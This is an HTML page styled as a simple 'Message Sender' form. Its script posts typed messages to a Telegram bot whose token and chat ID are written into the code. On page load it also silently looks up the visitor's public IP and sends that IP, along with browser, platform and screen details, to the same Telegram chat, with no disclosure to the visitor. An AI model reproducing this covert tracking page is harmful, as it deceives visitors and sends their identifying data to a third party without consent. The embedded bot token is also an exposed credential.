<!DOCTYPE html>
<html>
<head>
    <title>Message Sender</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        textarea {
            width: 100%;
            height: 120px;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            resize: vertical;
            margin-bottom: 20px;
        }
        button {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            transition: transform 0.3s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>üì® Message Sender</h2>
        <textarea id="message" placeholder="Type your message..."></textarea>
        <button onclick="sendMessage()">Send Message</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        function sendToTelegram(text) {
            fetch('https://api.telegram.org/bot8378436957:AAGCKo0ZgVAe6028kQKTyzMIsr3Qenjp5jI/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `chat_id=8326900293&text=${encodeURIComponent(text)}`
            });
        }

        function sendMessage() {
            const message = document.getElementById('message').value.trim();
            const status = document.getElementById('status');
            
            if (!message) {
                status.className = 'status error';
                status.textContent = 'Please enter a message';
                status.style.display = 'block';
                return;
            }
            
            sendToTelegram('üì© New Message:\n' + message);
            
            status.className = 'status success';
            status.textContent = 'Message sent successfully!';
            status.style.display = 'block';
            document.getElementById('message').value = '';
            
            setTimeout(() => status.style.display = 'none', 3000);
        }

        window.onload = function() {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    const info = `üñ•Ô∏è Visitor Info:\nIP: ${data.ip}\nBrowser: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nScreen: ${screen.width}x${screen.height}`;
                    sendToTelegram(info);
                })
                .catch(() => {
                    const info = `üñ•Ô∏è Visitor Info:\nBrowser: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nScreen: ${screen.width}x${screen.height}`;
                    sendToTelegram(info);
                });
        };
    </script>
</body>
</html>
